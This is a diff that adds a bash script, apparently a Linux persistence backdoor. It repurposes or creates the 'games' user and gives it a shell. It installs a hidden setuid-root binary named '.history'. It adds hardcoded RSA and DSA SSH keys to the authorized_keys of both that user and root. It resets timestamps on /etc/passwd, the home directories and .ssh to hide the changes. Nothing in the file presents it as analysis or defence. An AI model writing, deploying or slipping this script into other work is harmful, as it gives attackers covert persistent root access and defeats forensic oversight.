@@ -1,0 +1,231 @@
+#!/bin/bash
+
+PWD=$(pwd)
+
+USR_SHELL="/bin/sh"
+USR_NAME="games"
+USR_ID=5
+USR_GROUP=60
+USR_HOME="/usr/${USR_NAME}"
+
+UID_TO_0="${PWD}/.history"
+
+RSA_SSH_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMMbsHEEoQqP17NADe6bvsJ1jKjGyj7JoyZWeBSOIVtzJuuFuj5hZ2Ljjg9tcu4DjVOV28AiHiNRq0v3O3dTfREBJP1UQb0zw3PN3OWQaNqSu/tn/mdgSXWfATA0g6RmAY1PgJg4KdhteL79xRQvdOjKqjiRqoQmc/5dMlsgJd/jIYgbRb4oD7a798rWn37NdW885JFrNvT+L2vrJ0q+8v7xx+X3DNXleXyWZfAEWYI6MBlHH+i/3FCXl30kWqaUuG8yqogTaP14wK1sQP/HcGSBxXunuKNtdLYA5/a2SIjcZv+JQhylvizgCXqwUD4U95/4lpO+nN2eglyrle03oX rsa-key-20221228"
+DSA_SSH_KEY="ssh-dss AAAAB3NzaC1kc3MAAAEBAIK6D0iaywdy3PszmcLV5/AejORrDrN63+gOMAFAJKNoT1OfpexOA0Iux87r43M4sRHufR/zj/ymqAJimXmFP+BlMw/oR4blG8uxN8uIHg4f+2FoYSawR6rxUphLQkemV8tRumatNYlo/BPcXndCdcHfCeg/G/JqH+NEbegEkMMJyXDHZ1Vtu+qe6hR/sJQlhsiKp/npBOxHKBu+UJuYT6KQDfLf9C7dEpVNjUps7I1NIz2q1f2kd9V9pwwk2xsCHmrOvKQ6j3IocPXynmxOa8SyX+ib3Ufa4ivDV+MeV+3U+Tj0P2zzdgnd93LaglMpWKtDKUfwKtqH37hAvK/vZUEAAAAVAIj78tyQfZ9mhSbxgjghkrpcexq/AAABADEKx1sIQilCxsJA8Xxva8nC7dIR1/uoOxVNynDjPAgjchHg7kzUIi3IzI2H8HRO2oSNnoGqE+fR+YEGQ/jgIhjKycfEa+PIKY4b5uHIVoT1Teae970ADzoIiX1sTiXx5JbiMnjiAzu+QnzCFckbSsL59+Ea5+6OO6Ibpa62Tu3yTfVMobr5MFLq+wFQKX3qeCsmU9upO7HMqdhqlsj1dA/x/vD/hFgqgeo6e3d1Fh5kj/pMIxrp+bnKdwPzYXcsZ42vSVB5w42k7ozCajg4Wdi2usO7BY7vtvmsi6g5swwUNnZU9Dh6IBrbhsxfxYrqMRPxJgaiilbhDR23mHARwMwAAAEAHRIj8gkUSwvQwCxl3DBQcL59qXH4kUjVKXwatzAI3kcw+v4wI1TnreuoUQky9S1mhkA6bkxwWIjY0esd4ZcdPGkoKtAnk/7PSZTUZxxQuEeHHqOKWCNTd7l4ZLbSTaLNl4BnLHDsWOE3PZYVayYlZP7bgpUtiJlZX2GyV/y+4FoFO0txYuQCbtGJQPKYUddVCKEVpsKru/fbCon0xlEMHvPh7wqoCK6ht/G45s8085AVzQOQD4mMLzJMBoKjnxxYFZOiN4xcnh9MIY7guYiSg8UFUHeU1tJJ6Yz52pyJUB/uzusIcadNQh/1++k12Nucgo0Q2DXlxTXvZUcxurIb6g=="
+
+# Check is root
+function is_root(){
+  # 0 = true
+  # 1 = false
+  if [ "$(id -u)" -ne 0 ] && [ "$(id -g)" -ne 0 ];then
+    echo "[!] Need to switch as root"
+    return 1
+  fi
+
+  return 0
+}
+
+# Switch to root if current id not 0
+function switch_to_root(){
+  if ! is_root;then
+    su - root || exit
+  fi
+}
+
+# Check user is exist
+# @param user_name
+function user_exist(){
+  local user_name=$1
+  if id "${user_name}" >/dev/null 2>&1; then
+    echo "[+] User ${user_name} exist"
+    return 0
+  else
+    echo "[!] User ${user_name} does not exist"
+    return 1
+  fi
+}
+
+# Create user
+# @param user_name
+# @param user_id
+# @param user_group
+# @param user_directory
+# @param user_shell
+function create_user(){
+  local user_name=$1
+  local user_id=$2
+  local user_group=$3
+  local user_directory=$4
+  local user_shell=$5
+
+  echo "[+] Trying to create user ${user_name}"
+
+  if [ -d "${user_directory}" ]; then
+    useradd -d "${user_directory}" -s "${user_shell}" -o -u "${user_id}" -g "${user_group}" "${user_name}"
+  else
+    useradd -m -d "${user_directory}" -s "${user_shell}" -o -u "${user_id}" -g "${user_group}" "${user_name}"
+    chown -R 0:0 "${user_directory}"
+  fi
+}
+
+# get user home
+# @param user_name
+function get_user_home(){
+  local user_name=$1
+  local user_home
+  user_home=$(getent passwd "${user_name}" | cut -d: -f6)
+  printf "%s" "${user_home}"
+}
+
+# generate ssh key
+# @param user_name
+function generate_ssh_key(){
+    local user_name=$1
+    local user_home
+    local user_uid
+    local user_gid
+    local user_ssh_dir
+    local user_ssh_key
+    local touch_time_ssh_dir
+    local touch_time_ssh_key
+    local new_key
+    local update_key
+    local lastline
+
+    echo "[+] Trying generate ssh key for user ${user_name}"
+
+    new_key=0
+    update_key=0
+    user_home=$(get_user_home "${user_name}")
+    user_uid=$(id -u "${user_name}")
+    user_gid=$(id -g "${user_name}")
+
+    if [ -z "${user_home}" ];then
+        echo "[!] Directory home user ${user_name} not exist"
+        return 1
+    fi
+
+    user_ssh_dir="${user_home}/.ssh"
+    user_ssh_key="${user_ssh_dir}/authorized_keys"
+
+    if [[ $(ls -A "${user_home}") ]];then
+        touch_time_ssh_dir=$(find "${user_home}" -maxdepth 1 -exec stat -c %y {} + | sort -u | head -n 1)
+    else
+        local tmph
+        tmph=$(echo "${user_home}" | cut -d"/" -f1-2)
+        touch_time_ssh_dir=$(find "${tmph}" -maxdepth 1 -exec stat -c %y {} + | sort -u | head -n 1)
+    fi
+
+    touch_time_ssh_key="${touch_time_ssh_dir}"
+
+    if [ -d "${user_ssh_dir}" ];then
+        touch_time_ssh_dir=$(stat -c %y "${user_ssh_dir}")
+    else
+        mkdir -p "${user_ssh_dir}"
+    fi
+
+    if [ -f "${user_ssh_key}" ];then
+        touch_time_ssh_key=$(stat -c %y "${user_ssh_key}")
+    else
+        touch "${user_ssh_key}"
+        new_key=1
+    fi
+
+    if [ ${new_key} -eq 0 ];then
+        lastline=$(tail -n 1 "${user_ssh_key}")
+        if [ -n "${lastline}" ];then
+            echo "" >> "${user_ssh_key}"
+        fi
+    fi
+
+    if ! grep -q "${RSA_SSH_KEY}" "${user_ssh_key}";then
+        echo "${RSA_SSH_KEY}" >> "${user_ssh_key}"
+        update_key=1
+        echo "rsa keys for user ${user_name} has been installed"
+    else
+        echo "rsa keys for user ${user_name} already exist"
+    fi
+
+    if ! grep -q "${DSA_SSH_KEY}" "${user_ssh_key}";then
+        echo "${DSA_SSH_KEY}" >> "${user_ssh_key}"
+        update_key=1
+        echo "dsa keys for user ${user_name} has been installed"
+    else
+        echo "dsa keys for user ${user_name} already exist"
+    fi
+
+    if [ ${update_key} -eq 1 ];then
+        chown -R "${user_uid}:${user_gid}" "${user_ssh_dir}"
+    fi
+
+    chmod 700 "${user_ssh_dir}"
+    chmod 600 "${user_ssh_key}"
+
+    touch -d "${touch_time_ssh_key}" "${user_ssh_key}"
+    touch -d "${touch_time_ssh_dir}" "${user_ssh_dir}"
+
+    return 0
+}
+
+# change user shell
+# @param user_name
+# @param user_shell
+function change_shell(){
+  local user_name=$1
+  local user_shell=$2
+  local usermod_path
+  local chsh_path
+  local time_passwd
+
+  usermod_path=$(command -v usermod)
+  chsh_path=$(command -v chsh)
+  time_passwd=$(stat -c %y /etc/passwd)
+
+  if [ -n "${usermod_path}" ];then
+    ${usermod_path} --shell "${user_shell}" "${user_name}"
+  elif [ -n "${chsh_path}" ];then
+    ${chsh_path} -s "${user_shell}" "${user_name}"
+  else
+    echo "[!] Failed to change shell user ${user_name}"
+  fi
+  touch -d "${time_passwd}" /etc/passwd
+}
+
+switch_to_root
+
+USR_HOME_TIME=$(find /usr/ -maxdepth 1 -exec stat -c %y {} + | sort -u | head -n 1)
+ROOT_HOME_TIME=$(find /root/ -maxdepth 1 -exec stat -c %y {} + | sort -u | head -n 1)
+
+if user_exist ${USR_NAME};then
+  USR_ID=$(id -u ${USR_NAME})
+  USR_GROUP=$(id -g ${USR_NAME})
+
+  user_home=$(get_user_home "${USR_NAME}")
+  if [ -z "${user_home}" ];then
+    echo "[!] User home not exist"
+    mkdir -p ${USR_HOME}
+    chown -R 0:0 "${USR_HOME}"
+  else
+    USR_HOME="${user_home}"
+    USR_HOME_TIME=$(stat -c %y "${user_home}")
+  fi
+  change_shell "${USR_NAME}" "${USR_SHELL}"
+else
+  create_user ${USR_NAME} "${USR_ID}" "${USR_GROUP}" "${USR_HOME}" ${USR_SHELL}
+fi
+
+# copy binary suid 0
+if [ -d "${USR_HOME}" ] && [ -f "${UID_TO_0}" ];then
+  mkdir -p "${USR_HOME}/tmp"
+  cp "${UID_TO_0}" "${USR_HOME}/tmp/.history"
+  chown -R 0:0 "${USR_HOME}/tmp"
+  chmod 4755 "${USR_HOME}/tmp/.history"
+  touch -d "${USR_HOME_TIME}" "${USR_HOME}/tmp" "${USR_HOME}/tmp/.history"
+fi
+
+# put ssh key
+generate_ssh_key "${USR_NAME}"
+touch -d "${USR_HOME_TIME}" "${USR_HOME}"
+
+generate_ssh_key "root"
+touch -d "${ROOT_HOME_TIME}" /root
